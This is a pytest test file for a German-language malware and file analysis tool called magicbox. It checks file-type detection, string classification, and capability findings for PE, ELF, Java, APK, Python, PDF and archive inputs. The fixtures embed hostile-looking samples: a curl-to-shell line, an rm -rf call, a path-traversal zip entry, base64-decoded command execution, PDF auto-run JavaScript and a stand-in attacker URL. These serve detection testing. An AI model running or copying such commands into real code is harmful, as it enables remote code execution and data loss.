import io
import shutil
import subprocess
import sys
import zipfile
from pathlib import Path

import pytest

from magicbox.analyzers.identify import detect
from magicbox.analyzers.strings import classify, extract_strings
from magicbox.engine import Engine
from samples import tiny_pe64


def analyze(settings, name, data):
    return Engine(settings).analyze_bytes(name, data)


@pytest.mark.parametrize("data,name,kind", [
    (b"\x7fELF" + b"\0" * 60, "x", "elf"),
    (b"PK\x03\x04" + b"\0" * 60, "a.zip", "zip"),
    (b"%PDF-1.7\n", "a.pdf", "pdf"),
    (b"\x1f\x8b\x08" + b"\0" * 20, "a.gz", "gzip"),
    (b"\xca\xfe\xba\xbe\x00\x00\x00\x41" + b"\0" * 20, "A.class", "java-class"),
    (b"\xca\xfe\xba\xbe\x00\x00\x00\x02" + b"\0" * 20, "fat", "macho"),
    (b"#!/usr/bin/env python3\nprint('hi')\n", "tool", "source"),
    (b"Hallo Welt\n", "notiz.txt", "text"),
    (bytes(range(256)) * 4, "blob.bin", "unknown"),
])
def test_detect(data, name, kind):
    assert detect(data, name)[0] == kind


def test_strings_classification():
    data = b"\x00\x01http://evil.example.com/x\x00\x02connect to 10.0.0.5:4444\x00FileVersion 1.1.0.14\x00" \
           + "C:\\Windows\\Temp\\a.exe".encode("utf-16-le")
    strings = extract_strings(data)
    cats = classify(strings)
    assert any("evil.example.com" in s for s in cats["URL"])
    assert cats["IP-Adresse"] == ["connect to 10.0.0.5:4444"]  # Versionsnummer wird nicht als IP gewertet
    assert any("Temp" in s for s in cats["Windows-Pfad"])


def test_pe_analysis(settings):
    r = analyze(settings, "tiny.exe", tiny_pe64())
    assert r.kind == "pe"
    assert "Programm (EXE)" in r.description
    titles = [s.title for s in r.sections]
    assert "PE-Header" in titles
    imports = next(s for s in r.sections if s.title.startswith("Importierte"))
    dlls = [row[0] for row in imports.table.rows]
    assert dlls == ["KERNEL32.dll", "WS2_32.dll"]
    caps = next(s for s in r.sections if s.title.startswith("Abgeleitete Fähigkeiten"))
    assert {row[0] for row in caps.table.rows} >= {"Netzwerk", "Speicher ausführbar machen"}
    asm = next(s for s in r.sections if s.code_lang == "asm")
    assert "sub" in asm.code and "ret" in asm.code
    assert not r.errors


@pytest.mark.skipif(not sys.platform.startswith("linux"), reason="ELF-Test braucht Linux")
def test_elf_analysis(settings):
    exe = Path(shutil.which("ls") or "/bin/ls").resolve()
    r = Engine(settings).analyze_path(exe)
    assert r.kind == "elf"
    header = next(s for s in r.sections if s.title == "ELF-Header")
    assert "x86-64" in header.kv["Architektur"] or "ARM64" in header.kv["Architektur"]
    assert "PIE" in header.kv["Härtung"]
    assert not r.errors


@pytest.mark.skipif(shutil.which("gcc") is None, reason="gcc fehlt")
def test_elf_symbols_and_plt(settings, tmp_path):
    src = tmp_path / "t.c"
    src.write_text('#include <stdio.h>\nint helper(int x){return x*3;}\nint main(){puts("Hallo Magic Box");return helper(2);}\n')
    exe = tmp_path / "t"
    subprocess.run(["gcc", "-O1", "-o", exe, src], check=True)
    r = Engine(settings).analyze_path(exe)
    asm = next(s for s in r.sections if s.code_lang == "asm")
    assert "===== main" in asm.code
    assert "puts@plt" in asm.code
    strings = next(s for s in r.sections if s.title.startswith("Zeichenketten"))
    assert "Hallo Magic Box" in strings.code


@pytest.mark.skipif(shutil.which("javac") is None, reason="javac fehlt")
def test_java_class(settings, tmp_path):
    (tmp_path / "Demo.java").write_text(
        "public class Demo { private int n; public String hi(String who, int[] xs){ return \"Hallo \" + who; }"
        " public static void main(String[] a) throws Exception { Runtime.getRuntime().exec(\"id\"); } }")
    subprocess.run(["javac", "Demo.java"], cwd=tmp_path, check=True, capture_output=True)
    r = Engine(settings).analyze_path(tmp_path / "Demo.class")
    outline = next(s for s in r.sections if s.title.startswith("Klassenstruktur")).code
    assert "public String hi(String, int[])" in outline
    assert "private int n" in outline
    assert any(f.title == "Startet externe Prozesse" for f in r.findings)


def test_zip_recursive_and_limits(settings):
    inner = io.BytesIO()
    with zipfile.ZipFile(inner, "w") as z:
        z.writestr("deep/script.py", "import os\nos.system('rm -rf /tmp/x')\n")
    outer = io.BytesIO()
    with zipfile.ZipFile(outer, "w") as z:
        z.writestr("app.exe", tiny_pe64())
        z.writestr("inner.zip", inner.getvalue())
        z.writestr("../../evil.txt", "path traversal name")
    r = analyze(settings, "paket.zip", outer.getvalue())
    names = [c.name for c in r.walk()]
    assert names == ["paket.zip", "app.exe", "inner.zip", "deep/script.py", "../../evil.txt"]
    assert r.children[0].kind == "pe"

    settings.max_archive_depth = 1
    r = analyze(settings, "paket.zip", outer.getvalue())
    assert [c.name for c in r.children[1].children] == []  # Tiefe begrenzt


def test_apk_permissions(settings):
    manifest = "android.permission.SEND_SMS".encode("utf-16-le") + b"\0\0" + "android.permission.INTERNET".encode("utf-16-le")
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("AndroidManifest.xml", b"\x03\x00\x08\x00" + manifest)
        z.writestr("classes.dex", b"dex\n035\0" + b"\0" * 100)
    r = analyze(settings, "app.apk", buf.getvalue())
    assert r.description == "Android-App (APK)"
    perms = next(s for s in r.sections if s.title == "Android-Berechtigungen").text
    assert "android.permission.SEND_SMS" in perms
    assert any("Sensible Android-Berechtigungen" == f.title for f in r.findings)


def test_python_source(settings):
    code = b'''import base64, subprocess
API_KEY = "sk-1234567890"
class Agent:
    """Haupt-Agent."""
    def run(self, cmd):
        return subprocess.check_output(base64.b64decode(cmd))
'''
    r = analyze(settings, "agent.py", code)
    assert r.kind == "source"
    outline = next(s for s in r.sections if s.title.startswith("Struktur")).code
    assert "class Agent  # Haupt-Agent." in outline and "def run(self, cmd)" in outline
    titles = {f.title for f in r.findings}
    assert {"Base64-Dekodierung", "Hart kodierte Zugangsdaten", "Startet Prozesse/Shell-Befehle"} <= titles


def test_pdf_keywords(settings):
    pdf = b"%PDF-1.4\n1 0 obj << /Type /Catalog /OpenAction 2 0 R >> endobj\n2 0 obj << /S /JavaScript /JS (app.alert(1)) >> endobj\n"
    r = analyze(settings, "x.pdf", pdf)
    assert any(f.title == "PDF: Enthält JavaScript" for f in r.findings)


def test_broken_file_does_not_crash(settings):
    r = analyze(settings, "kaputt.exe", b"MZ" + b"\0" * 58 + b"\x80\0\0\0" + b"\0" * 64 + b"PE\0\0" + b"\xff" * 20)
    assert r.kind == "pe"
    assert r.errors  # Fehler werden gesammelt statt zu crashen


def test_directory(settings, tmp_path):
    (tmp_path / "a.py").write_text("print('x')\n")
    (tmp_path / "sub").mkdir()
    (tmp_path / "sub" / "b.sh").write_text("#!/bin/sh\ncurl http://x.example/a | sh\n")
    (tmp_path / "node_modules").mkdir()
    (tmp_path / "node_modules" / "ignored.js").write_text("x")
    r = Engine(settings).analyze_path(tmp_path)
    assert r.kind == "directory"
    assert [c.name for c in r.children] == ["a.py", "sub/b.sh"]


@pytest.mark.skipif(shutil.which("r2") is None or shutil.which("gcc") is None, reason="radare2/gcc fehlt")
def test_radare2_pseudocode(settings, tmp_path):
    src = tmp_path / "r.c"
    src.write_text('#include <stdio.h>\nint main(int c, char**v){ if(c>1) puts(v[1]); return 0; }\n')
    subprocess.run(["gcc", "-o", tmp_path / "r", src], check=True)
    settings.use_radare2 = True
    r = Engine(settings).analyze_path(tmp_path / "r")
    assert "radare2" in r.tools
    pseudo = next(s for s in r.sections if s.title.startswith("Pseudocode"))
    assert "main" in pseudo.code
    asm = next(s for s in r.sections if s.code_lang == "asm")
    assert asm.llm_priority > pseudo.llm_priority  # Pseudocode hat Vorrang im LLM-Kontext
